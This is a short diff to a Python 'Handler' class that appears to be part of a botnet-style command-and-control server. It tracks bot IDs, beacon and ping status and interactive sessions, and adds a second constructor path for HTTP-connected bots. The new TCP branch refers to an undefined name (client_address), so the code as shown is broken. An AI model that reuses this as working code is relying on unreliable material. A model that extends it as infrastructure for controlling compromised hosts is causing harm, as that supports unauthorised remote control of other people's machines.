@@ -11,7 +11,37 @@ import random
 
 class Handler(threading.Thread):
 
-    def __init__(self, client, client_address, bot_id):
+    def __init__(self, *args):
+        #tcp signature
+        if len(args) == 3:
+            threading.Thread.__init__(self)
+            # self.logger = logger
+            self.client = args[0]
+            self.client_address = args[1]
+            self.ip = client_address[0]
+            self.port = client_address[1]
+            self.bot_id = args[2]
+            self.info = [self.bot_id,self.ip,self.port]
+            self.beacon_wait = False
+            self.os = ''
+            self.interactive = False
+            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
+                                                            # [0] = PING, [1] = BEACON
+        #http signature
+        elif len(args) == 1:
+            threading.Thread.__init__(self)
+            #self.logger = logger
+            self.ip = '127.0.0.1'
+            self.port = 5000
+            self.bot_id = args[0]
+            self.info = [self.bot_id,self.ip,self.port]
+            self.beacon_wait = False
+            self.os = ''
+            self.interactive = False
+            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
+                                                            # [0] = PING, [1] = BEACON
+
+    '''def __init__(self, client, client_address, bot_id):
         threading.Thread.__init__(self)
         # self.logger = logger
         self.client = client
@@ -25,7 +55,7 @@ class Handler(threading.Thread):
         self.interactive = False
         self.status = ["UP","UP"]                           # <--UP - DOWN - ERR 
                                                             # [0] = PING, [1] = BEACON
-
+    '''
         # Log by
 
 
